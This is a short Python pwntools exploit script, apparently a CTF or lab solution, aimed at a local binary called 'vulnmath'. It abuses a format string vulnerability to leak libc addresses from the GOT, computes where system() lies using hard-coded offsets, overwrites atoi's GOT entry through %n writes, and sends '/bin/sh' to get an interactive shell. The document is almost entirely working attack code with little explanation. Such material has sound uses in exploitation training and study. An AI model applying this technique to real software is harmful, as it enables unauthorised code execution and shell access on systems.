from pwn import *

app = process('./vulnmath')
elf = ELF("./vulnmath")

printf_got_address = elf.got['printf'] 
puts_got_address = elf.got['puts']
atoi_got_address = elf.got['atoi']

stack_offset = 6

def read_addr(addr):
    app.sendlineafter("> ", p32(addr) + "%" + str(stack_offset) + "$s")
    app.readline()
    return app.readline()

printf_libc_address = u32(read_addr(printf_got_address)[4:8])
puts_libc_address = u32(read_addr(puts_got_address)[4:8]) 

# use blukat.me to checkup used libc version and use proper offsets

#libc = ELF('libc.so.6')
#printf_libc_offset = libc.symbols['printf']
#system_libc_offset = libc.symbols['system']

printf_libc_offset = 0x0503e0
system_libc_offset = 0x0423d0
system_libc_address = printf_libc_address - printf_libc_offset + system_libc_offset

# Number of bytes to print in order to write an address. 
# Minus 8 because of two 4B addresses at the begining of payload
first_half =  (system_libc_address % (256 * 256)) - 8
second_half = (system_libc_address / (256 * 256)) - first_half - 8

payload = p32(atoi_got_address) + p32(atoi_got_address + 2) + "%" + str(first_half) + "x%" + str(stack_offset) + "$n%" + str(second_half) + "x%" + str(stack_offset +1) + "$n"

app.sendlineafter("> ", payload)
app.sendlineafter("> ", "/bin/sh\x00")

app.interactive()